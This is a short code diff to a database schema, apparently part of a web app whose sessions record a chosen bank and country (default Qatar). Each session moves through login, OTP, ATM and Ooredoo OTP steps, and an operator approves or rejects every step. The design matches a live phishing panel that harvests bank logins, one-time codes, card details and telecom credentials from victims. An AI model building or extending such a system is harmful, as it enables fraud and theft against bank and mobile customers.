@@ -18,6 +18,11 @@ export type InsertUser = typeof users.$inferInsert;
 export const sessions = pgTable("sessions", {
   id: varchar("id", { length: 64 }).primaryKey(),
   selectedBank: varchar("selectedBank", { length: 50 }).notNull(),
+  country: varchar("country", { length: 100 }).default("Qatar"),
+  status: varchar("status", { length: 20 }).default("pending").notNull(), // pending, loading, approved, rejected
+  currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
+  adminAction: varchar("adminAction", { length: 20 }), // approve, reject
+  errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().notNull(),
 });
